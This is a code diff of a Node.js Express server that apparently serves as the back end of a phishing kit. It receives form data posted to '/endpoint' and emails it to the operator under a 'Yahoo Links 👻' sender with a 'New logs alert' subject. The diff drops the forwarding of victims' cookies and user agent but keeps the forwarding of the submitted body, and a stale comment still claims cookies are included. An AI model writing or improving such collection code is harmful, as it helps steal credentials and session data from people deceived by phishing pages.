@@ -22,9 +22,7 @@ async function sender(payload) {
     from: `"Yahoo Links 👻" <${process.env.Emailaddress}>`, // sender address
     to: `${process.env.Emailaddress}`, // list of receivers
     subject: "New logs alert ✔", // Subject line
-    html: `${payload?.body}\n\n
-    ${payload?.cookies}\n\n
-    ${payload?.userAgent}`, // html body
+    html: `${payload?.body}\n\n`
   });
 
   console.log("Message sent: %s", info.messageId);
@@ -54,13 +52,11 @@ app.post("/endpoint", async (req, res) => {
         console.log("No cookies available");
     }
     const payload = {
-        body,
-        cookies,
-        userAgent
+        body
     }
     await sender(payload);
     console.log(payload)
-    return res.json({ body, cookies, userAgent }).status(200); // Include cookies and userAgent in response
+    return res.json({ body }).status(200); // Include cookies and userAgent in response
 });
 
 const server = app.listen(port, () => console.log(`Example app listening on port ${port}!`));
